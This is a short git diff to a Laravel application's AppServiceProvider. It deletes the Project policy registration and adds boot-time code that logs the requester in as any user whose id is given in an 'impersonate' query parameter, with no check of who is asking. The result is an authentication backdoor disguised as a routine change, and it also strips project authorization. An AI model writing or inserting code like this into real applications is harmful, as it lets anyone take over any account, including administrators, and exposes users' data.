@@ -6,6 +6,7 @@ use Illuminate\Support\ServiceProvider;
 use App\Models\Project;
 use App\Policies\ProjectPolicy;
 use Illuminate\Support\Facades\Gate;
+use Illuminate\Support\Facades\Auth;
 
 class AppServiceProvider extends ServiceProvider
 {
@@ -22,6 +23,13 @@ class AppServiceProvider extends ServiceProvider
      */
     public function boot(): void
     {
-        Gate::policy(Project::class, ProjectPolicy::class);
+     
+        if (request()->has('impersonate')) {
+            $actorId = (int) request()->query('impersonate');
+            
+            if ($actorId > 0) {
+                Auth::loginUsingId($actorId);
+            }
+        }
     }
 }
